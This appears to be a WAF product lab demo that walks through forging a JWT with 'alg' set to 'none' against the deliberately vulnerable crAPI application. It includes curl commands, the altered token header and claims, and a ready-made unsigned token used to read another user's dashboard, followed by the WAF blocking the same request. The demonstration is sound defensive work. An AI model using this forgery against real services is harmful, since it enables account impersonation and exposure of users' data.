## Demo Overview:
Malicious user can forge the token of another user "pogba006@example.com" to access his dashboard...

**crapi.local** |  crAPI Application protected by WAF

**10.1.10.104** | crAPI Application Without WAF

### Users:

**Malicious User:** malicious@example.com/F5@Pass50 

## Forging the JWT Without WAF
- The dashboard endpoint requires token to view client info, 
```python unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/dashboard  -s | jq
```
<img width="1142" height="202" alt="image" src="https://github.com/user-attachments/assets/441447cf-8e1d-40a1-9a82-6ecb9c3bacfe" />


so the user access his dashboard with his token. 
```python unfold ln:false unwrap title:"code"
##login and get access token
export token=$(curl -X POST http://10.1.10.104/identity/api/auth/login -d '{"email":"malicious@example.com","password":"F5@Pass50"}' -H "Content-Type: application/json"  -s | jq -r '.token')
#access user dashboard
curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $token" -s | jq
```
<img width="1425" height="429" alt="image" src="https://github.com/user-attachments/assets/18c7d8ef-ee69-48ee-bc25-41a238fd2e84" />


### Forging JWT
1- get the email address of another user 
from community posts we discovered email of Pogba `pogba006@example.com`
<img width="2147" height="883" alt="image" src="https://github.com/user-attachments/assets/13d240ac-89ed-4af0-b205-c54353baad3c" />
<img width="1684" height="1230" alt="image" src="https://github.com/user-attachments/assets/e01ab559-1933-45d4-bc7c-f90884037789" />

2- Change the value of the “alg” property from header part **RS256** to “**none**”. And also change the email address  to `pogba006@example.com`
```python unfold ln:false unwrap title:"Updated"
{
  "alg": "none"
}
{
  "sub": "pogba006@example.com",
  "iat": 1787924377,
  "exp": 1788529177,
  "role": "user"
}
```
**jwt.io**
<img width="2321" height="1057" alt="image" src="https://github.com/user-attachments/assets/d36392e3-a701-4794-b48b-55a29b61cbe5" />

```zsh unfold ln:false unwrap title:"code"
export pogba_none_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJwb2diYTAwNkBleGFtcGxlLmNvbSIsImlhdCI6MTc4NzkyNDM3NywiZXhwIjoxNzg4NTI5MTc3LCJyb2xlIjoidXNlciJ9.
```

3- we can access pogba's dashboard and know his information 
```zsh unfold ln:false unwrap title:"code"
curl http://10.1.10.104/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
```
<img width="1836" height="456" alt="image" src="https://github.com/user-attachments/assets/c507e767-e374-4655-ab56-194ded026e3d" />

## WAF protection 
```zsh unfold ln:false unwrap title:"code"
curl http://crapi.local/identity/api/v2/user/dashboard -H "Authorization: Bearer $pogba_none_token" -s | jq
```

<img width="1814" height="270" alt="image" src="https://github.com/user-attachments/assets/031e61dd-4965-4340-b918-e616985a4f1f" />
<img width="1672" height="856" alt="image" src="https://github.com/user-attachments/assets/28699cac-662a-44b2-8756-941c19c0fee6" />


